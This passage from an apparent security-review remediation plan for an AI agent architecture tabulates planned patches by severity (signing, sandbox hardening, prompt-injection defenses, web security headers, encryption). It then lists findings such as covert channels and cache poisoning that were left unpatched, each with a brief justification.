| 2 | Switch to per-component asymmetric signing (Ed25519) | Critical | 6.3, 9.1 |
| 3 | Expand threat model (supply chain, provider, DoS, insider) | High | 6.1 |
| 4 | Harden Gear sandbox (TOCTOU, secret injection, layering) | High | 5.6.3, 5.6.4 |
| 5 | Strengthen prompt injection defenses (layering, multi-hop, memory) | High | 5.2.6 |
| 6 | Acknowledge JavaScript secret-zeroing limitations + master key lifecycle | High | 6.4 |
| 7 | Harden shell Gear and Sentinel Memory auto-approval | High | 5.6.5, 5.3.8 |
| 8 | Add Axis fast-path verification | High | 4.3 |
| 9 | Specify web security headers (CSP, CORS, clickjacking) | Medium | 5.5 (new 5.5.8) |
| 10 | Specify WebSocket authentication model | Medium | 5.5.4 |
| 11 | Add audit log hash chain integrity | Medium | 6.6 |
| 12 | Add CSRF protection for approval endpoint | Medium | 5.5.6 |
| 13 | Add replay protection to AxisMessage | Medium | 9.1 (covered by Patch 2) |
| 14 | Acknowledge Sentinel Memory indirect channel + add limits | Medium | 5.3.8 |
| 15 | Encrypt backups | Medium | 8.4 |
| 16 | Add PII stripping limitations disclaimer | Medium | 5.4.7 |
| 17 | Specify network security details (IPv6, DNS rebinding, proxy design) | Medium | 6.5 |
| 18 | Specify TLS configuration requirements | Medium | 6.5 |
| 19 | Add security posture indicator in Bridge | Medium | 5.5 (new 5.5.9) |
| 20 | Specify AES-256-GCM nonce management | Low | 6.4 |

### Findings Intentionally Not Patched

The following findings from the security review are acknowledged but not converted to patches:

| Finding | Reason |
|---------|--------|
| **2.2**: Gear names as covert channel | Reviewer rates this as Low severity and notes the channel is "heavily constrained" by the fixed catalog. The bandwidth is impractically low. |
| **2.4**: Timing side channels | Reviewer rates this as Low and "theoretical." Specifying mitigations would add complexity without meaningful security improvement. |
| **1.4**: Physical side-channel attacks | Acknowledged in the threat model expansion (Patch 3 adds a note), but specific mitigations are out of scope for a software architecture document. |
| **14.4**: Semantic cache poisoning | Reviewer rates this as Low severity. The cache's 24-hour TTL and high similarity threshold already limit the attack surface. |
| **11.2**: Argon2id parameters | Covered within Patch 6 (master key lifecycle) which specifies parameters per deployment tier. |
| **11.3**: HMAC-SHA256 appropriateness | Resolved by Patch 2's switch to Ed25519. |
